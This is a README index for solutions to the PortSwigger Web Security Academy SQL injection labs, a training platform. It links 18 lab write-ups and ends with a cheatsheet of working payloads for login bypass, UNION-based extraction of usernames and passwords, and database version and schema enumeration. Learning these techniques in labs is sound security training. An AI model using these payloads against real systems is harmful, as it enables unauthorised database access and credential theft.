# SQL Injection - PortSwigger Web Security Academy

Complete solutions and exploits for all SQL Injection labs.

## Labs

### Apprentice
1. [SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](01-retrieve-hidden-data.md)
2. [SQL injection vulnerability allowing login bypass](02-login-bypass.md)

### Practitioner - UNION attacks
3. [SQL injection UNION attack, determining the number of columns](03-union-determine-columns.md)
4. [SQL injection UNION attack, finding a column containing text](04-union-find-text-column.md)
5. [SQL injection UNION attack, retrieving data from other tables](05-union-retrieve-data.md)
6. [SQL injection UNION attack, retrieving multiple values in a single column](06-union-multiple-values.md)

### Practitioner - Examining the database
7. [SQL injection attack, querying the database type and version on Oracle](07-version-oracle.md)
8. [SQL injection attack, querying the database type and version on MySQL and Microsoft](08-version-mysql-microsoft.md)
9. [SQL injection attack, listing the database contents on non-Oracle databases](09-list-contents-non-oracle.md)
10. [SQL injection attack, listing the database contents on Oracle](10-list-contents-oracle.md)

### Practitioner - Blind SQL injection
11. [Blind SQL injection with conditional responses](11-blind-conditional-responses.md)
12. [Blind SQL injection with conditional errors](12-blind-conditional-errors.md)
13. [Blind SQL injection with time delays](13-blind-time-delays.md)
14. [Blind SQL injection with time delays and information retrieval](14-blind-time-info-retrieval.md)
15. [Blind SQL injection with out-of-band interaction](15-blind-oob-interaction.md)
16. [Blind SQL injection with out-of-band data exfiltration](16-blind-oob-exfiltration.md)

### Practitioner - Other
17. [Visible error-based SQL injection](17-visible-error-based.md)
18. [SQL injection with filter bypass via XML encoding](18-filter-bypass-xml.md)

## Quick Payloads Cheatsheet

| Lab | Payload |
|-----|--------|
| 01 Hidden data | `'+OR+1=1--` |
| 02 Login bypass | `administrator'--` |
| 03 UNION columns | `' UNION SELECT NULL,NULL,NULL--` |
| 04 UNION text | `' UNION SELECT 'a','b'--` |
| 05 UNION data | `' UNION SELECT username, password FROM users--` |
| 06 UNION concat | `' UNION SELECT NULL, username || ':' || password FROM users--` |
| 07 Version Oracle | `' UNION SELECT BANNER, NULL FROM v$version--` |
| 08 Version MySQL | `' UNION SELECT @@version, NULL--` |
| 09 List non-Oracle | `' UNION SELECT table_name, NULL FROM information_schema.tables--` |
| 10 List Oracle | `' UNION SELECT table_name, NULL FROM all_tables--` |
